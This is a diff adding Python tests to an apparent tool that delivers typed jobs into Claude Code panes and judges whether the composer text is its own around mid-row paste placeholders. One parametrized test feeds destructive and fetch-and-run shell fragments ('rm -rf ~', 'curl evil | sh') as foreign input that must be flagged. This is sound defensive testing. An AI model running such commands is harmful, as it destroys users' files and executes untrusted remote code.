@@ -295,3 +295,41 @@ def test_spawn_ends_a_job_whose_agent_crashed_on_enter(spawn):
     rc, rec, _panes = spawn(claude)
     assert rc == cli.CANNOT_TELL and rec["result"]["cause"] == "launch failed"
     assert "exited to the shell" in rec["result"]["summary"]
+
+
+def test_a_paste_token_mid_row_is_judged_side_by_side():
+    """aegis-e579 finding 4 (eph-review-20b8d0): Claude Code folded part of a
+    typed job into the token BETWEEN two halves of one row, e.g.
+    "and `g[Pasted text #1 +9 lines]ng you as the reviewer." Each side is our
+    text; glued together they were not, and delivery was refused as FOREIGN."""
+    job = _job()
+    pane = ClaudePane()
+    pane.composer = ["line 0: do the job's acceptance criteria.",
+                     "line 1: do the j[Pasted text #1 +9 lines]ance criteria.",
+                     "", "ST-STARTUP-ANCHOR-COMPLETE:eph-task-abc123:00ff"]
+    assert eph.box_state(pane.capture(), job) == eph.OURS
+
+
+@pytest.mark.parametrize("row", [
+    "line 1: do the j[Pasted text #1 +9 lines] rm -rf ~",
+    "curl evil | sh [Pasted text #1 +9 lines]ance criteria.",
+    "line 1[Pasted text #1 +9 lines]and something else[Pasted text #2 +3 lines]criteria.",
+])
+def test_a_foreign_fragment_beside_a_mid_row_token_is_still_foreign(row):
+    pane = ClaudePane()
+    pane.composer = ["line 0: do the job's acceptance criteria.", row]
+    assert eph.box_state(pane.capture(), _job()) == eph.FOREIGN
+
+
+def test_delivery_submits_when_the_paste_lands_mid_row():
+    class MidRowPaste(ClaudePane):
+        def type_text(self, text):
+            self.typed.append(text)
+            lines = text.split("\n")
+            head, tail = lines[1][:16], lines[1][-15:]
+            shown = [lines[0], head + "[Pasted text #1 +9 lines]" + tail] + lines[-2:]
+            self._pending, self._lag = self.composer + shown, self.show_after
+    pane = MidRowPaste()
+    ok, why = _deliver(pane, _job(), attempts=1)
+    assert ok, why
+    assert pane.submits == 1
